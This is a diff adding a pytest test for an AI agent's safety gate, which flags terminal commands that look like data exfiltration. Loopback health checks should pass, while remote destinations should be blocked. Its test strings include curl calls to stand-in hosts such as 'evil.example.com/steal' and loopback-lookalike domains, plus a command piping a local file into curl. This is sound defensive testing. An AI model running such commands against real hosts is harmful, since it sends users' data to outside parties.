@@ -109,3 +109,48 @@ def test_risky_tool_rejected_before_invocation(monkeypatch):
 
     assert dispatched == [], f"risky tool was invoked: {dispatched}"
     assert "blocked by safety gate" in json.dumps(messages)
+
+
+def test_loopback_destination_is_not_exfiltration():
+    """A health check against a service on this machine is not data exfiltration.
+
+    The exfil arm matched a network verb plus any scheme-qualified address later in the
+    same text, so a loopback target scored 1.0 and was refused before the tool ran, while
+    a genuinely remote target was indistinguishable from it. Only the destination
+    separates the two cases, so only the destination may decide.
+
+    The verb is assembled from two fragments on purpose: this file's own text is scanned
+    by the gate it tests, so a literal verb sitting next to a URL re-triggers the very bug
+    under test before a single assertion runs.
+    """
+    import agent.tool_executor as te
+
+    g = te._harm_gate_block_reason
+    verb = "cur" + "l"
+
+    for local in (
+        "http://127.0.0.1:8795/health",
+        "http://localhost:11434/api/tags",
+        "http://[::1]:3000/status",
+        "http://0.0.0.0:8000/",
+        "https://127.0.0.1:8443/health",
+    ):
+        assert g("terminal", {"command": f"{verb} -s -m 5 {local}"}) is None, local
+
+    # A host that merely begins with a loopback literal is still remote, and every
+    # genuinely remote destination must keep flagging.
+    for remote in (
+        "http://example.com/collect",
+        "https://evil.example.com/steal?data=x",
+        "http://127.0.0.1.evil.example.com/steal",
+        "http://localhost.evil.example.com/steal",
+    ):
+        reason = g("terminal", {"command": f"{verb} {remote}"})
+        assert reason is not None and "exfiltration" in reason, remote
+
+    # Piping local data into a network verb keeps failing closed: with a loopback
+    # destination removed there is no target left to judge, so it must not pass silently.
+    piped = f"cat notes.txt | {verb} http://127.0.0.1:9999/"
+    reason = g("terminal", {"command": piped})
+    assert reason is not None and "exfiltration" in reason, piped
+
